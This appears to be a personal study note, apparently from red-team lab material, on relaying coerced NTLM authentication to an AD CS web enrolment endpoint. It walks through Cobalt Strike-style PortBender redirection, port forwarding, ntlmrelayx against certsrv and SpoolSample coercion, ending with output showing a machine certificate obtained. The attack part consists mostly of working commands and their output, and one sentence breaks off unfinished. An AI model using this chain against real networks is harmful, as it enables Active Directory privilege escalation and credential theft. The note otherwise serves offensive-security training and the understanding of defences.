---
creation date: January 5th 2022
last modified date: January 5th 2022
aliases: []
tags: #📖
---

Primary Categories: [[01 - Operation]]
Secondary Categories:  [[02 - External]] - [[02 - Internal]]
Links: [[Privilege Escalation]]
Search Tag: #📖  

# [[NTLM Relaying to ADCS]]  

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at `http[s]://<hostname>/certsrv`, and by default supports **NTLM** and **Negotiate** authentication methods.

In the default configuration, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controller location, relay the request to the CA and obtain a certificate for that DC, then use it to obtain a TGT.

Another aspect to be aware of is that you cannot relay authentication back to the original machine. If the CA is running on the DC 


As SYSTEM on a server/workstation:

-   Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.
-   Start a reverse port forward to forward traffic hitting port 8445 to the Team Server on port 445.
-   Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
                                            
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445

beacon> socks 1080
[+] started SOCKS4a server on: 1080

```

Start ntlmrelayx with proxychains (10.10.15.75 is CA.):

```
root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

Next, use one of the remote authentication methods to force a connection from WKSTN-3 to the relay (10.10.17.25 is the server/workstation running your relay)(10.10.15.254 is the authentication you are getting, you should be able to use anything).
```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

Look at kali for a base64 encoded ticket (output slightly trimmed for brevity).

```
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
 ...  OK
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] GOT CERTIFICATE! ID 5
[*] Base64 certificate of user WKSTN-3$:
MIIQ3Q[...snip...]NzkQ==

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 5th 2022 (02:26 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
